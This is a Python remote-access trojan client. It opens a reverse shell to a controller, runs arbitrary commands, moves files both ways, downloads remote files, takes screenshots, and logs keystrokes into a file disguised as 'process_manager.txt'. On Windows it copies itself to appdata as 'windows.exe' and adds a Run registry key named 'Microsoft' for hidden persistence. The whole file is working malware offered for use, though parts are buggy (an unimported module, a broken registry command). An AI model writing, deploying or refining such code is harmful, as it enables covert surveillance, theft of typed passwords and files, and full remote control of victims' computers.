#!/usr/bin/python3

import socket
from termcolor import colored
import subprocess
import json
import os
import base64
import shutil
import os
import platform
import time
import requests
from mss import mss
import threading
import pynput.keyboard

host=socket.gethostbyname(socket.gethostname())

log=""

stop_threads=False                          								# To stop Threads 

def keylogger_keys(key):                    								# To log keys in log variables and then later copy it into a file
	
	if stop_threads:
		return
	global log
	try:
		log=log+str(key.char)
	except AttributeError:
		if key==key.space:
			log=log+ " "
		elif key==key.up or key==key.down or key==key.right or key==key.left:
			log=log+""
		else:
			log=log+" "+ str(key) + " " 


def report():                             									# Threaded program which executes every 10 seconds and paste log variables value into file
	
	if stop_threads:
		return
	global log
	global path
	with open(keylog_path,'a') as fin:
		 fin.write(log)
		 log=""
	timer=threading.Timer(10,report)
	timer.start()
		 
def start():                             									# to start the keylogger

	keyboard_listener=pynput.keyboard.Listener(on_press=keylogger_keys)
	with keyboard_listener:
		report()
		keyboard_listener.join()

def download_online(url):													#To download file online in target system
	
	response=requests.get(url)
	file_name=url.split("/")[-1]	
	if(response.status_code==200):
		with open(file_name,"wb") as file_write:
			file_write.write(response.content)
			reliable_send("[+] Downloaded succesfully....")
	else:
		reliable_send("[-] Invalid URL or something else went wrong.......") 
	
	
def screenshot():															# to take screenshot
	
	with mss() as screen:
		screen.shot()
	
		
def reliable_send(data):                                                    # send function implementation
	
	if isinstance(data,bytes):
		data=data.decode("utf-8")
	json_data=json.dumps(data)
	reverseSock.send(json_data.encode("utf-8"))
		
def reliable_recv():														# Receive function implementation
	
	data=""
	while True:
		try:
			data= data+reverseSock.recv(1024).decode()
			if isinstance(data,bytes):
				data=data.decode("utf-8")
			return json.loads(data)
		except ValueError:
			continue   
		
def connectionRecursively():												# connect to server every 5 sec until connected

	try:
		reverseSock.connect(("127.0.1.1",9988 ))
	except:
		time.sleep(5)
		connectionRecursively()
	

def reverse():

	global reverseSock
	reverseSock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	
	while True:
		
		temp=0
		connectionRecursively()
		message="[*] Connection Established . Press q to exit shell"
		reliable_send(message)
		temmp=0
		
		while True:
			
			if temmp==1:
				reliable_send("[!!]  Welcome Back")
				temmp=0 
				                             #// Here i was getting error becasue temmp=1 so other side is sending instead of receiving it so our shell just hangs
			command=reliable_recv()
			print(command)
			comm=command.split()
			
			if(command=="q"):
				
				temp=1
				print(colored("[-] Disconnecting Wait......","blue") )
				stop_threads=True
				break;
			
			elif command=="help":
				continue
				
			elif (command=="back"):
				temmp=1
				continue
				
			elif (len(comm)==0):
					continue
					
			elif(comm[0]=="cd"):
				
				try:
					os.chdir(comm[1])
				except:
					continue
					
			elif (comm[0]=="download"):
				
				try:
					path = os.path.exists(comm[1])
					if not path:
						reliable_send("[-] Sorry the file does not exist in specified path ")
					else :
						with open(comm[1],"rb" ) as file1:
							file_data=file1.read()
							reliable_send(base64.b64encode(file_data))
				except:
					reliable_send("[-] !!! Failed to download File")
					
					
			elif (comm[0]=="upload"):
				
				try:
					with open(comm[1],"wb") as file2:
						file_data=reliable_recv()
						if(file_data=="[-] Failed To Upload"):
							continue
						file2.write(base64.b64decode(file_data))	
				except:
					continue
					
			elif (comm[0]=="gets"):
				
				download_online(comm[1])
				
			elif(comm[0]=="screenshot"):
				
				try:
					screenshot()
					with open("monitor-1.png", "rb") as sc:
						reliable_send(base64.b64encode(sc.read()))
					os.remove("monitor-1.png")
				except:
					reliable_send("[-] Error occured while taking screenshot")
			
			elif (comm[0]=="keylog_start"):
				
				t1=threading.Thread(target=start )
				t1.start()
				
			elif (comm[0]=="keylog_dump"):
				
				with  open(keylog_path,'rb') as key_file:
					reliable_send(key_file.read())
						
			else:
				
				proc=subprocess.Popen(command,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
				result=proc.stdout.read() + proc.stderr.read()
				reliable_send(str(result,"utf-8"))
				
		if(temp==1):
			
			print(colored("[-] Connection Closed Exiting ......","blue"))
			break;
			

keylog_path="keylog.txt"
		
if(platform.system=='Windows'):
	
	location=os.environ["appdata"]+"\\windows.exe"
	keylog_path=os.environ["appdata"]+"\\process_manager.txt"	
	if not os.path.exists(location):
		shutil.copyfile(sys.executable,location)                            # To create persistence in windows OS
		subprocess.call("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Microsoft /t REG_SZ /d "' + location + '" ",shell=True)

reverse()

reverseSock.close()
